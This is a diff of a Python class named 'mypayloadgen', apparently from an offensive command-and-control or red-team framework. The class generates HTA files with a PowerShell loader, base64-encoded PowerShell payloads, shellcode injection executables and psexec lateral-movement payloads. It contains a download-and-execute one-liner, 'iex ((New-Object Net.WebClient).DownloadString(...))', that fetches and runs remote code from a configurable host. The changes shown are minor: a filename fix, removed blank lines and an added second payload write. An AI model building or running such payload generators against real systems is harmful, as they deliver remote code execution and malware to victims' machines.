@@ -54,7 +54,7 @@ class mypayloadgen():
         self.__pexec_hta_template = "pslauncher.hta"
         self.__pexec_hta_outputname = "test.hta"
         self.__pexec_hta_payload_tag = r"%%PAYLOAD%%"
-        self.__pexec_oneliner_template = "Invoke-psonliner.ps1"
+        self.__pexec_oneliner_template = "Invoke-psoneliner.ps1"
         self.__pexec_oneliner_webrequest = "iex ((New-Object Net.WebClient).DownloadString('http://{}:{}/{}'));Invoke-myclient"
         self.__pexec_hta_filename = "Invoke-myclient.ps1"
         self.__pexec_oneliner_ip = "127.0.0.1"
@@ -74,7 +74,6 @@ class mypayloadgen():
 
     def set_injection_target(self,target):
         self.__gtojs_injection_target = target
-    
 
     def set_pexec_config(self,filename,ip,port):
         if len(filename) != 0:
@@ -83,7 +82,6 @@ class mypayloadgen():
             self.__pexec_oneliner_ip = ip
         if len(port) != 0:
             self.__pexec_oneliner_port = int(port)
-
 
     def gen_pexec_hta(self): #hta using powershell loader
         mycwd = os.path.join(self.__parentdir,self.__to_client)
@@ -109,7 +107,6 @@ class mypayloadgen():
         
         with open(os.path.join(self.__parentdir,self.__to_payload,self.__pexec_hta_outputname),mode='w') as f:
             f.write(all_of_it.replace(self.__pexec_hta_payload_tag,myb64))
-
 
     def gen_gtojs(self):
         mycwd = os.path.join(self.__parentdir,self.__to_client)
@@ -180,8 +177,10 @@ class mypayloadgen():
         with open(os.path.join(self.__parentdir,self.__to_template,self.__payload_pstemplate),mode='r') as f:
             all_of_it = f.read()
         
-        #print(all_of_it.replace(self.__payload_tag,myb64))
         with open(os.path.join(self.__parentdir,self.__to_payload,self.__payload_outputname),mode='w') as f:
+            f.write(all_of_it.replace(self.__payload_tag,myb64))
+
+        with open(os.path.join(self.__parentdir,self.__to_psdb,self.__payload_outputname),mode='w') as f:
             f.write(all_of_it.replace(self.__payload_tag,myb64))
 
     def gen_exe(self):
@@ -228,7 +227,6 @@ class mypayloadgen():
         subprocess.run(["conf-inject32.bat"], shell=True, cwd=mycwd, stdout=self.__mystd) #to shellcode
         subprocess.run(["inject32.bat"], shell=True, cwd=mycwd, stdout=self.__mystd) #buid
 
-
     def gen_psexec(self): #this will jump using current payload config, windows\temp need to be accessable
         
         mycwd = os.path.join(self.__parentdir,self.__to_client)
@@ -256,10 +254,6 @@ class mypayloadgen():
         
         with open(os.path.join(self.__parentdir,self.__to_psdb,self.__psexec_outputname),mode='w') as f:
             f.write(all_of_it.replace(self.__payload_tag,myb64))
-
-        
-
-
 
     def set_config(self,typestr,reversestr,configstra,configstrb):
 
